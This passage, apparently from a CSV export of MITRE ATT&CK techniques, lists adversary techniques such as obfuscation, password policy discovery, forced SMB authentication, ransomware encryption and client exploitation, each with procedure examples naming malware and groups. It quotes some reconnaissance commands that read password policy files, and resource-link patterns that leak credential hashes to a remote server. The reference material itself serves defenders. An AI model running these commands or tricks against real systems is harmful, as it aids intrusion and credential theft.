header. [Ramsay] can also embed information within document footers.\t', ""[PUNCHBUGGY] has hashed most its code's functions and encrypted payloads with base64 and XOR."", '[COATHANGER] can store obfuscated configuration information in the last 56 bytes of the file `/date/.bd.key/preload.so`.', '[Maze] has decrypted strings and other important information during the encryption process. [Maze] also calls certain functions dynamically to hinder analysis.\t', '[Epic] heavily obfuscates its code to make analysis more difficult.', '[CORESHELL] obfuscates strings using a custom stream cipher.', '[PlugX] can use API hashing and modify the names of strings to evade detection.', 'A version of [XTunnel] introduced in July 2015 obfuscated the binary using opaque predicates and other techniques in a likely attempt to obfuscate it and bypass security products.', '[jRAT] Java payload is encrypted with AES. Additionally, backdoor files are encrypted using DES as a stream cipher. Later variants of [jRAT] also incorporated AV evasion methods such as Java bytecode obfuscation via the commercial Allatori obfuscation tool.', '[OopsIE] uses the Confuser protector to obfuscate an embedded .Net Framework assembly used for C2. [OopsIE] also encodes collected data in hexadecimal format before writing to files on disk and obfuscates strings.', '[GrimAgent] has used Rotate on Right (RoR) and Rotate on Left (RoL) functionality to encrypt strings.', '[ShimRatReporter] encrypted gathered information with a combination of shifting and XOR using a static key.', '[StreamEx] obfuscates some commands by using statically programmed fragments of strings when starting a DLL. It also uses a one-byte xor against 0x91 to encode configuration data.', '[APT41] used VMProtected binaries in multiple intrusions.', '[SDBbot] has the ability to XOR the strings for its installer component with a hardcoded 128 byte key.', '[SLOWPULSE] can hide malicious code in the padding regions between legitimate functions in the Pulse Secure `libdsplibs.so` file.', '[TajMahal] has used an encrypted Virtual File System to store plugins.', '[Denis] obfuscates its code and encrypts the API names.', '[FinFisher] is heavily obfuscated in many ways, including through the use of spaghetti code in its functions in an effort to confuse disassembly programs. It also uses a custom XOR algorithm to obfuscate code.', '[Samurai] can encrypt the names of requested APIs and deliver its final payload as a compressed, encrypted and base64 encoded blob.', 'Some [Orz] strings are base64 encoded, such as the embedded DLL known as MockDll.', '[BUSHWALK] can encrypt the resulting data generated from C2 commands with RC4.', '[BoomBox] can encrypt data using AES prior to exfiltration.', '[Cobalt Strike] can hash functions to obfuscate calls to the Windows API and use a public/private key pair to encrypt Beacon session metadata.', '[Industroyer] uses heavily obfuscated code in its Windows Notepad backdoor.', '[Comnie] uses RC4 and Base64 to obfuscate strings.', '[APT29] has used encoded PowerShell commands.', '[UNC2452] used encoded PowerShell commands.', '[TRITON] encoded the two inject.bin and imain.bin payloads.', '[Operation Wocao] has executed PowerShell commands which were encoded or compressed using Base64, zlib, and XOR.', '[Frankenstein] has run encoded commands from the command line.', 'A [Night Dragon] DLL included an XOR-encoded section.', '[Dust Storm] has encoded payloads with a single-byte XOR, both skipping the key itself and zeroing in an attempt to avoid exposing the key.', '[Dtrack] has used a dropper that embeds an encrypted payload as extra data.', '[Honeybee] drops files with base64-encoded data.', 'The [SMOKEDHAM] source code is embedded in the dropper as an encrypted string.', '[Machete] employed some visual obfuscation techniques by naming variables as combinations of letters to hinder analysis.', '[PowerDuke] uses steganography to hide backdoors in PNG files, which are also encrypted using the Tiny Encryption Algorithm (TEA).', '[Exaramel] uses RC4 for encrypting the configuration.', 'hides any strings related to its own indicators of compromise.', 'APT34 has used base64-encoded files that are dropped to victims.', 'If the victim is using PowerShell 3.0 or later, POWERSOURCE writes its decoded payload to an Alternate Data Stream (ADS) named kernel32.dll that is saved in <code>%PROGRAMDATA%\\Windows\\</code>.']",False
T1154,Trap,"The <code>trap</code> command allows programs and shells to specify commands that will be executed upon receiving interrupt signals. A common situation is a script allowing for graceful termination and handling of common  keyboard interrupts like <code>ctrl+c</code> and <code>ctrl+d</code>. Adversaries can use this to register code to be executed when the shell encounters specific interrupts either to gain execution or as a persistence mechanism. Trap commands are of the following format <code>trap 'command list' signals</code> where ""command list"" will be executed when ""signals"" are received.",[],True
T1201,Password Policy Discovery,"Adversaries may attempt to access detailed information about the password policy used within an enterprise network or cloud environment. Password policies are a way to enforce complex passwords that are difficult to guess or crack through [Brute Force] This information may help the adversary to create a list of common passwords and launch dictionary and/or brute force attacks which adheres to the policy (e.g. if the minimum password length should be 8, then not trying passwords such as 'pass123'; not checking for more than 3-4 passwords per account if the lockout is set to 6 as to not lock out accounts).  Password policies can be set and discovered on Windows, Linux, and macOS systems via various command shell utilities such as <code>net accounts (/domain)</code>, <code>Get-ADDefaultDomainPasswordPolicy</code>, <code>chage -l <username></code>, <code>cat /etc/pam.d/common-password</code>, and <code>pwpolicy getaccountpolicies</code>  . Adversaries may also leverage a [Network Device CLI] on network devices to discover password policy information (e.g. <code>show aaa</code>, <code>show aaa common-criteria policy all</code>).  Password policies can be discovered in cloud environments using available APIs such as <code>GetAccountPasswordPolicy</code> in AWS .","['The <code>net accounts</code> and <code>net accounts /domain</code> commands with [Net] can be used to obtain password policy information.', '[CrackMapExec] can discover the password policies applied to the target system.', '[BloodHound] can collect password policy information on the target environment.', 'During [Operation CuckooBees] the threat actors used the `net accounts` command as part of their advanced reconnaissance.', '[OilRig] has used net.exe in a script with <code>net accounts /domain</code> to find the password policy of a domain.', '[Chimera] has used the NtdsAudit utility to collect information related to accounts and passwords.', '[Kwampirs] collects password policy information with the command <code>net accounts</code>.', '[Turla] has used <code>net accounts</code> and <code>net accounts /domain</code> to acquire password policy information.', '[PoshC2] can use <code>Get-PassPol</code> to enumerate the domain password policy.', 'APT34 has used net.exe in a script with <code>net accounts /domain</code> to find the password policy of a domain.']",False
T1546,Event Triggered Execution,"Adversaries may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events. Various operating systems have means to monitor and subscribe to events such as logons or other user activity such as running specific applications/binaries. Cloud environments may also support various functions and services that monitor and can be invoked in response to specific cloud events.  Adversaries may abuse these mechanisms as a means of maintaining persistent access to a victim via repeatedly executing malicious code. After gaining access to a victim system, adversaries may create/modify event triggers to point to malicious content that will be executed whenever the event trigger is invoked.  Since the execution can be proxied by an account with higher permissions, such as SYSTEM or service accounts, an adversary may be able to abuse these triggered execution mechanisms to escalate their privileges. ","['[Pacu] can set up S3 bucket notifications to trigger a malicious Lambda function when a CloudFormation template is uploaded to the bucket. It can also create Lambda functions that trigger upon the creation of users, roles, and groups.']",False
T1187,Forced Authentication,"Adversaries may gather credential material by invoking or forcing a user to automatically provide authentication information through a mechanism in which they can intercept.  The Server Message Block (SMB) protocol is commonly used in Windows networks for authentication and communication between systems for access to resources and file sharing. When a Windows system attempts to connect to an SMB resource it will automatically attempt to authenticate and send credential information for the current user to the remote system.  This behavior is typical in enterprise environments so that users do not need to enter credentials to access network resources.  Web Distributed Authoring and Versioning (WebDAV) is also typically used by Windows systems as a backup protocol when SMB is blocked or fails. WebDAV is an extension of HTTP and will typically operate over TCP ports 80 and 443.    Adversaries may take advantage of this behavior to gain access to user account hashes through forced SMB/WebDAV authentication. An adversary can send an attachment to a user through spearphishing that contains a resource link to an external server controlled by the adversary (i.e. [Template Injection] or place a specially crafted file on navigation path for privileged accounts (e.g. .SCF file placed on desktop) or on a publicly accessible share to be accessed by victim(s). When the user's system accesses the untrusted resource it will attempt authentication and send information, including the user's hashed credentials, over SMB to the adversary controlled server.  With access to the credential hash, an adversary can perform off-line [Brute Force] cracking to gain access to plaintext credentials.   There are several different ways this can occur.  Some specifics from in-the-wild use include:  * A spearphishing attachment containing a document with a resource that is automatically loaded when the document is opened (i.e. [Template Injection] The document can include, for example, a request similar to <code>file[:]//[remote address]/Normal.dotm</code> to trigger the SMB request.  * A modified .LNK or .SCF file with the icon filename pointing to an external reference such as <code>\\[remote address]\pic.png</code> that will force the system to load the resource when the icon is rendered to repeatedly gather credentials. ","['[DarkHydrus] used [Template Injection] to launch an authentication window for users to enter their credentials.', '[Dragonfly] has gathered hashed user credentials over SMB using spearphishing attachments with external resource links and by modifying .LNK file icon resources to collect credentials from virtualized systems.', '[EnvyScout] can use protocol handlers to coax the operating system to send NTLMv2 authentication responses to attacker-controlled infrastructure.', '[Dragonfly 2.0] has gathered hashed user credentials over SMB using spearphishing attachments with external resource links and by modifying .LNK file icon resources to collect credentials from virtualized systems.', 'Dragonfly has performed forced authentication to gather hashed user credentials over SMB using spearphishing attachments with external resource links and by modifying .LNK file icon resources to collect credentials from virtualized systems.']",False
T1599,Network Boundary Bridging,"Adversaries may bridge network boundaries by compromising perimeter network devices or internal devices responsible for network segmentation. Breaching these devices may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.  Devices such as routers and firewalls can be used to create boundaries between trusted and untrusted networks.  They achieve this by restricting traffic types to enforce organizational policy in an attempt to reduce the risk inherent in such connections.  Restriction of traffic can be achieved by prohibiting IP addresses, layer 4 protocol ports, or through deep packet inspection to identify applications.  To participate with the rest of the network, these devices can be directly addressable or transparent, but their mode of operation has no bearing on how the adversary can bypass them when compromised.  When an adversary takes control of such a boundary device, they can bypass its policy enforcement to pass normally prohibited traffic across the trust boundary between the two separated networks without hinderance.  By achieving sufficient rights on the device, an adversary can reconfigure the device to allow the traffic they want, allowing them to then further achieve goals such as command and control via [Multi-hop Proxy] or exfiltration of data via [Traffic Duplication] Adversaries may also target internal devices responsible for network segmentation and abuse these in conjunction with [Internal Proxy] to achieve the same goals.  In the cases where a border device separates two separate organizations, the adversary can also facilitate lateral movement into new victim environments.",[],False
T1486,Data Encrypted for Impact,"Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.  In the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted (and often renamed and/or tagged with specific file markers). Adversaries may need to first employ other behaviors, such as [File and Directory Permissions Modification] or [System Shutdown/Reboot] in order to unlock and/or gain access to manipulate these files. In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR.   To maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like [Valid Accounts] [OS Credential Dumping] and [SMB/Windows Admin Shares] Encryption malware may also leverage [Internal Defacement] such as changing victim wallpapers, or otherwise intimidate victims by sending ransom notes or other messages to connected printers (known as ""print bombing"").  In cloud environments, storage objects within compromised accounts may also be encrypted.","['[Maze] has disrupted systems by encrypting files on targeted machines, claiming to decrypt files if a ransom payment is made. [Maze] has used the ChaCha algorithm, based on Salsa20, and an RSA algorithm to encrypt files.', '[Bad Rabbit] has encrypted files and disks using AES-128-CBC and RSA-2048.', '[ThiefQuest] encrypts a set of file extensions on a host, deletes the original files, and provides a ransom note with no contact information.', '[APT38] has used Hermes ransomware to encrypt files with AES256.', '[Ragnar Locker] encrypts files on the local machine and mapped drives prior to displaying a note demanding a ransom.', '[Royal] uses a multi-threaded encryption process that can partially encrypt targeted files with the OpenSSL library and the AES256 algorithm.', '[JCry] has encrypted files and demanded Bitcoin to decrypt those files. ', '[Babuk] can use ChaCha8 and ECDH to encrypt data.', '[REvil] can encrypt files on victim systems and demands a ransom to decrypt the files.', '[Diavol] has encrypted files using an RSA key though the `CryptEncrypt` API and has appended filenames with "".lock64"". ', '[Cuba] has the ability to encrypt system data and add the "".cuba"" extension to encrypted files. ', '[DarkGate] can deploy follow-on ransomware payloads.', '[BlackCat] has the ability to encrypt Windows devices, Linux devices, and VMWare instances.', '[Prestige] has leveraged the CryptoPP C++ library to encrypt files on target systems using AES and appended filenames with `.enc`.', '[Magic Hound] has used BitLocker and DiskCryptor to encrypt targeted workstations. ', '[LockerGoga] has encrypted files, including core Windows OS files, using RSA-OAEP MGF1 and then demanded Bitcoin be paid for the decryption key.', '[DEATHRANSOM] can use public and private key pair encryption to encrypt files for ransom payment.', '[EKANS] uses standard encryption library functions to encrypt files.', '[ProLock] can encrypt files on a compromised host with RC6, and encrypts the key with RSA-1024.', '[AvosLocker] has encrypted files and network resources using AES-256 and added an `.avos`, `.avos2`, or `.AvosLinux` extension to filenames.', '[HELLOKITTY] can use an embedded RSA-2048 public key to encrypt victim data for ransom.', '[Scattered Spider] has used BlackCat ransomware to encrypt files on VMWare ESXi servers.', '[BitPaymer] can import a hard-coded RSA 1024-bit public key, generate a 128-bit RC4 key for each file, and encrypt the file in place, appending <code>.locked</code> to the filename.', '[Cheerscrypt] can encrypt data on victim machines using a Sosemanuk stream cipher with an Elliptic-curve Diffie–Hellman (ECDH) generated key. ', '[WannaCry] encrypts user files and demands that a ransom be paid in Bitcoin to decrypt those files.', '[FIN7] has encrypted virtual disk volumes on ESXi servers using a version of Darkside ransomware.', '[DCSrv] has encrypted drives using the core encryption mechanism from DiskCryptor.', '[Black Basta] can encrypt files with the ChaCha20 cypher and using a multithreaded process to increase speed.', '[WastedLocker] can encrypt data and leave a ransom note. ', 'During [C0018] the threat actors used [AvosLocker] ransomware to encrypt files on the compromised network.', '[Pysa] has used RSA and AES-CBC encryption algorithm to encrypt a list of targeted file extensions. ', 'During [C0015] the threat actors used [Conti] ransomware to encrypt a compromised network.', '[MegaCortex] has used the open-source library, Mbed Crypto, and generated AES keys to carry out the file encryption process.', '[SynAck] encrypts the victims machine followed by asking the victim to pay a ransom. ', '[FIVEHANDS] can use an embedded NTRU public key to encrypt data for ransom.', '[Conti] can use <code>CreateIoCompletionPort()</code>, <code>PostQueuedCompletionStatus()</code>, and <code>GetQueuedCompletionPort()</code> to rapidly encrypt files, excluding those with the extensions of .exe, .dll, and .lnk. It has used a different AES-256 encryption key per file with a bundled RAS-4096 public encryption key that is unique for each victim. [Conti] can use “Windows Restart Manager” to ensure files are unlocked and open for encryption.', ""[Xbash] has maliciously encrypted victim's database systems and demanded a cryptocurrency ransom be paid."", ""[Pay2Key] can encrypt data on victim's machines using RSA and AES algorithms in order to extort a ransom payment for decryption."", '[Sandworm Team] has used [Prestige] ransomware to encrypt data at targeted organizations in transportation and related logistics industries in Ukraine and Poland.', '[Akira] encrypts files in victim environments as part of ransomware operations.', '[Egregor] can encrypt all non-system files using a hybrid AES-RSA algorithm prior to displaying a ransom note. ', '[Indrik Spider] has encrypted domain-controlled systems using [BitPaymer]', '[NotPetya] encrypts user files and disk structures like the MBR with 2048-bit RSA.', '[SamSam] encrypts victim files using RSA-2048 encryption and demands a ransom be paid in Bitcoin to decrypt those files.', '[APT41] used a ransomware called Encryptor RaaS to encrypt files on the targeted systems and provide a ransom note to the user.', '[Ryuk] has used a combination of symmetric (AES) and asymmetric (RSA) encryption to encrypt files. Files have been encrypted with their own AES key and given a file extension of .RYK. Encrypted directories have had a ransom note of RyukReadMe.txt written to the directory.', '[Avaddon] encrypts the victim system using a combination of AES256 and RSA encryption schemes.', '[Netwalker] can encrypt files on infected machines to extort victims.\t', '[KillDisk] has a ransomware component that encrypts files with an AES key that is also RSA-1028 encrypted.', '[Clop] can encrypt files using AES, RSA, and RC4 and will add the "".clop"" extension to encrypted files. ', '[TA505] has used a wide variety of ransomware, such as [Clop] Locky, Jaff, Bart, Philadelphia, and GlobeImposter, to encrypt victim files and demand a ransom payment.', '[XCSSET] performs AES-CBC encryption on files under <code>~/Documents</code>, <code>~/Downloads</code>, and <code>~/Desktop</code> with a fixed key and renames files to give them a <code>.enc</code> extension. Only files with sizes  less than 500MB are encrypted.', '[Seth-Locker] can encrypt files on a targeted system, appending them with the suffix .seth.', '[Shamoon] has an operational mode for encrypting data instead of overwriting it.', '[RobbinHood] will search for an RSA encryption key and then perform its encryption process on the system files. ', '[FIN8] has deployed ransomware such as [Ragnar Locker] White Rabbit, and attempted to execute Noberus on compromised networks.', '[Akira] encrypts victim filesystems for financial extortion purposes.']",False
T1488,Disk Content Wipe,"Adversaries may erase the contents of storage devices on specific systems as well as large numbers of systems in a network to interrupt availability to system and network resources.  Adversaries may partially or completely overwrite the contents of a storage device rendering the data irrecoverable through the storage interface. Instead of wiping specific disk structures or files, adversaries with destructive intent may wipe arbitrary portions of disk content. To wipe disk content, adversaries may acquire direct access to the hard drive in order to overwrite arbitrarily sized portions of disk with random data. Adversaries have been observed leveraging third-party drivers like [RawDisk] to directly access disk content. This behavior is distinct from [Data Destruction] because sections of the disk erased instead of individual files.  To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disk content may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts] [OS Credential Dumping] and [Windows Admin Shares]",[],True
T1553,Subvert Trust Controls,"Adversaries may undermine security controls that will either warn users of untrusted activity or prevent execution of untrusted programs. Operating systems and security products may contain mechanisms to identify programs or websites as possessing some level of trust. Examples of such features would include a program being allowed to run because it is signed by a valid code signing certificate, a program prompting the user with a warning because it has an attribute set from being downloaded from the Internet, or getting an indication that you are about to connect to an untrusted site.  Adversaries may attempt to subvert these trust mechanisms. The method adversaries use will depend on the specific mechanism they seek to subvert. Adversaries may conduct [File and Directory Permissions Modification] or [Modify Registry] in support of subverting these controls. Adversaries may also create or steal code signing certificates to acquire trust on target systems. ",['[Axiom] has used digital certificates to deliver malware.'],False
T1573,Encrypted Channel,"Adversaries may employ an encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if secret keys are encoded and/or generated within malware samples/configuration files.","['[RCSession] can use an encrypted beacon to check in with C2.', '[Cryptoistic] can engage in encrypted communications with C2.', '[Chaes] has used encryption for its C2 channel. ', '[Tropic Trooper] has encrypted traffic with the C2 to prevent network detection.', '[PowGoop] can receive encrypted commands from C2.', '[Magic Hound] has used an encrypted http proxy in C2 communications.', '[PowerLess] can use an encrypted channel for C2 communications.', '[BITTER] has encrypted their C2 communications.', '[APT29] has used multiple layers of encryption within malware to protect C2 communication.', '[Lizar] can support encrypted communications between the client and server.', '[gh0st RAT] has encrypted TCP communications to evade detection.', 'In the [Triton Safety Instrumented System Attack] [TEMP.Veles] used cryptcat binaries to encrypt their traffic.', '[NETWIRE] can encrypt C2 communications.', '[MacMa] has used TLS encryption to initialize a custom protocol for C2 communications.']",False
T1174,Password Filter DLL,"Windows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as dynamic link libraries (DLLs) containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts.  Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation.  Adversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made. ",[],True
T1002,Data Compressed,"An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network. The compression is done separately from the exfiltration channel and is performed using a custom program or algorithm, or a more common compression library or utility such as 7zip, RAR, ZIP, or zlib.","['[Soft Cell] used winrar to compress and encrypt stolen data prior to exfiltration.', '[Exaramel for Windows] automatically compresses files before sending them to the C2 server. ', '[Threat Group-3390] has used RAR to compress, encrypt, and password-protect files prior to exfiltration.', '[CORALDECK] has created password-protected RAR, WinImage, and zip archives to be exfiltrated.']",True
T1081,Credentials in Files,"Adversaries may search local file systems and remote file shares for files containing passwords. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.  It is possible to extract passwords from backups or saved virtual machines through [OS Credential Dumping]  Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller.   In cloud environments, authenticated user credentials are often stored in local configuration and credential files. In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files.   ","['[Mimikatz] <code>DPAPI</code> module can harvest protected credentials stored and/or cached by browsers and other user applications by interacting with Windows cryptographic application programming interface (API) functions.', '[Machete] exfiltrates the files “key3.db” and “signons.sqlite”, which store passwords, from several browsers. ', 'APT28 has been known to specifically look for Firefox passwords on the file system ']",True
T1128,Netsh Helper DLL,Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility.  The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at <code>HKLM\SOFTWARE\Microsoft\Netsh</code>.  Adversaries can use netsh.exe with helper DLLs to proxy execution of arbitrary code in a persistent manner when netsh.exe is executed automatically with another Persistence technique or if other persistent software is present on the system that executes netsh.exe as part of its normal functionality. Examples include some VPN software that invoke netsh.exe.   Proof of concept code exists to load Cobalt Strike's payload using netsh.exe helper DLLs. ,[],True
T1056,Input Capture,"Adversaries may use methods of capturing user input to obtain credentials or collect information. During normal system usage, users often provide credentials to various different locations, such as login pages/portals or system dialog boxes. Input capture mechanisms may be transparent to the user (e.g. [Credential API Hooking] or rely on deceiving the user into providing input into what they believe to be a genuine service (e.g. [Web Portal Capture]","['[metaMain] can log mouse events.', '[Mafalda] can conduct mouse event logging.', '[Chaes] has a module to perform any API hooking it desires. ', '[FlawedAmmyy] can collect mouse events.', '[Kobalos] has used a compromised SSH client to capture the hostname, port, username and password used to establish an SSH connection from the compromised host. ', '[APT39] has utilized tools to capture mouse movements.', 'APT34 has used a keylogging tool called KEYPUNCH.', 'captures keystrokes.']",
T1203,Exploitation for Client Execution,"Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.  Several types exist:  ### Browser-based Exploitation  Web browsers are a common target through [Drive-by Compromise] and [Spearphishing Link] Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.  ### Office Applications  Common office and productivity applications such as Microsoft Office are also targeted through [Phishing] Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.  ### Common Third-party Applications  Other applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.","['[Sidewinder] has exploited vulnerabilities to gain execution including CVE-2017-11882 and CVE-2020-0674.', '[APT28] has exploited Microsoft Office vulnerability CVE-2017-0262 for execution.', '[Threat Group-3390] has exploited CVE-2018-0798 in Equation Editor.', '[Agent Tesla] has exploited Office vulnerabilities such as CVE-2017-11882 and CVE-2017-8570 for execution during delivery. ', '[Sandworm Team] has exploited vulnerabilities in Microsoft PowerPoint via OLE objects (CVE-2014-4114) and Microsoft Word via crafted TIFF images (CVE-2013-3906).', '[Dragonfly] has exploited CVE-2011-0611 in Adobe Flash Player to gain execution on a targeted system.', '[Andariel] has exploited numerous ActiveX vulnerabilities, including zero-days.', '[Bankshot] leverages a known zero-day vulnerability in Adobe Flash to execute the implant into the victims’ machines.', ' [The White Company] has taken advantage of a known vulnerability in Microsoft Word (CVE 2012-0158) to execute code.', '[EXOTIC LILY] has used malicious documents containing exploits for CVE-2021-40444 affecting Microsoft MSHTML.', '[Lazarus Group] has exploited Adobe Flash vulnerability CVE-2018-4878 for execution.', '[Ember Bear] has exploited Microsoft Office vulnerability CVE-2017-11882.', '[APT29] has used multiple software exploits for common client software, like Microsoft Word, Exchange, and Adobe Reader, to gain code execution.', '[BlackTech] has exploited multiple vulnerabilities for execution, including Microsoft Office vulnerabilities CVE-2012-0158, CVE-2014-6352, CVE-2017-0199, and Adobe Flash CVE-2015-5119.', '[EvilBunny] has exploited CVE-2011-4369, a vulnerability in the PRC component in Adobe Reader.', '[Xbash] can attempt to exploit known vulnerabilities in Hadoop, Redis, or ActiveMQ when it finds those services running in order to conduct further execution.', '[SUPERNOVA] was installed via exploitation of a SolarWinds Orion API authentication bypass vulnerability (CVE-2020-10148).', '[Confucius] has exploited Microsoft Office vulnerabilities, including CVE-2015-1641, CVE-2017-11882, and CVE-2018-0802.', '[Patchwork] uses malicious documents to deliver remote execution exploits as part of. The group has previously exploited CVE-2017-8570, CVE-2012-1856, CVE-2014-4114, CVE-2017-0199, CVE-2017-11882, and CVE-2015-1641.', '[APT12] has exploited multiple vulnerabilities for execution, including Microsoft Office vulnerabilities (CVE-2009-3129, CVE-2012-0158) and vulnerabilities in Adobe Reader and Flash (CVE-2009-4324, CVE-2009-0927, CVE-2011-0609, CVE-2011-0611).', '[Ramsay] has been embedded in documents exploiting CVE-2017-0199, CVE-2017-11882, and CVE-2017-8570.', '[Axiom] has used exploits for multiple vulnerabilities including CVE-2014-0322, CVE-2012-4792, CVE-2012-1889, and CVE-2013-3893.', '[Higaisa] has exploited CVE-2018-0798 for execution.', ""During [Frankenstein] the threat actors exploited CVE-2017-11882 to execute code on the victim's machine."", '[Cobalt Group] had exploited multiple vulnerabilities for execution, including Microsoft’s Equation Editor (CVE-2017-11882), an Internet Explorer vulnerability (CVE-2018-8174), CVE-2017-8570, CVE-2017-0199, and CVE-2017-8759.', '[SpeakUp] attempts to exploit the following vulnerabilities in order to execute its malicious script: CVE-2012-0874, CVE-2010-1871, CVE-2017-10271, CVE-2018-2894, CVE-2016-3088, JBoss AS 3/4/5/6, and the Hadoop YARN ResourceManager. ', '[Leviathan] has exploited multiple Microsoft Office and .NET vulnerabilities for execution, including CVE-2017-0199, CVE-2017-8759, and CVE-2017-11882.', '[APT37] has used exploits for Flash Player (CVE-2016-4117, CVE-2018-4878), Word (CVE-2017-0199), Internet Explorer (CVE-2020-1380 and CVE-2020-26411), and Microsoft Edge (CVE-2021-26411) for execution.', '[TA459] has exploited Microsoft Word vulnerability CVE-2017-0199 for execution.', '[Mustang Panda] has exploited CVE-2017-0199 in Microsoft Word to execute code.', '[APT3] has exploited the Adobe Flash Player vulnerability CVE-2015-3113 and Internet Explorer vulnerability CVE-2014-1776.', '[BRONZE BUTLER] has exploited Microsoft Office vulnerabilities CVE-2014-4114, CVE-2018-0802, and CVE-2018-0798 for execution.', '[Transparent Tribe] has crafted malicious files to exploit CVE-2012-0158 and CVE-2010-3333 for execution.', '[Tropic Trooper] has executed commands through Microsoft security vulnerabilities, including CVE-2017-11882, CVE-2018-0802, and CVE-2012-0158.', '[Tonto Team] has exploited Microsoft vulnerabilities, including CVE-2018-0798, CVE-2018-8174, CVE-2018-0802, CVE-2017-11882, CVE-2019-9489 CVE-2020-8468, and CVE-2018-0798 to enable execution of their delivered malicious payloads. ', '[Aoqin Dragon] has exploited CVE-2012-0158 and CVE-2010-3333 for execution against targeted systems.', '[Inception] has exploited CVE-2012-0158, CVE-2014-1761, CVE-2017-11882 and CVE-2018-0802 for execution.', '[HAWKBALL] has exploited Microsoft Office vulnerabilities CVE-2017-11882 and CVE-2018-0802 to deliver the payload. ', '[DealersChoice] leverages vulnerable versions of Flash to perform execution.', '[APT41] leveraged the follow exploits in their operations: CVE-2012-0158, CVE-2015-1641, CVE-2017-0199, CVE-2017-11882, and CVE-2019-3396. ', 'During [Operation Dust Storm] the threat actors exploited Adobe Flash vulnerability CVE-2011-0611, Microsoft Windows Help vulnerability CVE-2010-1885, and several Internet Explorer vulnerabilities, including CVE-2011-1255, CVE-2012-1889, and CVE-2014-0322.', '[BITTER] has exploited Microsoft Office vulnerabilities CVE-2012-0158, CVE-2017-11882, CVE-2018-0798, and CVE-2018-0802.', '[Woody RAT] has relied on CVE-2022-30190 (Follina) for execution during delivery.', '[Cobalt Strike] can exploit Oracle Java vulnerabilities for execution, including CVE-2011-3544, CVE-2013-2465, CVE-2012-4681, and CVE-2013-2460.', '[Elderwood] has used exploitation of endpoint software, including Microsoft Internet Explorer Adobe Flash vulnerabilities, to gain execution. They have also used zero-day exploits.', '[Darkhotel] has exploited Adobe Flash vulnerability CVE-2015-8651 for execution.', '[APT32] has used RTF document that includes an exploit to execute malicious code. (CVE-2017-11882)', '[admin@338] has exploited client software vulnerabilities for execution, such as Microsoft Word CVE-2012-0158.', '[APT33] has attempted to exploit a known vulnerability in WinRAR (CVE-2018-20250), and attempted to gain remote code execution via a security bypass vulnerability (CVE-2017-11774).', '[MuddyWater] has exploited the Office vulnerability CVE-2017-0199 for execution.', '[InvisiMole] has installed legitimate but vulnerable Total Video Player software and wdigest.dll library drivers on compromised hosts to exploit stack overflow and input validation vulnerabilities for code execution.', ""[Frankenstein] has used CVE-2017-11882 to execute code on the victim's machine."", '[Agent Tesla] exploits CVE-2017-11882 in Microsoft’s Equation Editor to execute a process.', '[KeyBoy] exploits the vulnerability CVE-2012-0158 for execution.']",False
T1570,Lateral Tool Transfer,"Adversaries may transfer tools or other files between systems in a compromised environment. Once brought into the victim environment (i.e., [Ingress Tool Transfer] files may then be copied from one system to another to stage adversary tools or other files over the course of an operation.  Adversaries may copy files between internal victim systems to support lateral movement using inherent file sharing protocols such as file sharing over [SMB/Windows Admin Shares] to connected network shares or with authenticated connections via [Remote Desktop Protocol]  Files can also be transferred using native or otherwise present tools on the victim system, such as scp, rsync, curl, sftp, and [ftp] In some cases, adversaries may be able to leverage [Web Service] such as Dropbox or OneDrive to copy files from one machine to another via shared, automatically synced folders.","['[Emotet] has copied itself to remote systems using the `service.exe` filename.', '[BlackCat] can replicate itself across connected servers via `psexec`.', '[APT32] has deployed tools after moving laterally using administrative accounts.\t', '[Aoqin Dragon] has spread malware in target networks by copying modules to folders masquerading as removable devices.', 'Operators deploying [Netwalker] have used psexec to copy the [Netwalker] payload across accessible systems.', '[BITSAdmin] can be used to create [BITS Jobs] to upload and/or download files from SMB file servers.', '[FIN10] has deployed Meterpreter stagers and SplinterRAT instances in the victim network after moving laterally.', '[ftp] may be abused by adversaries to transfer tools or files 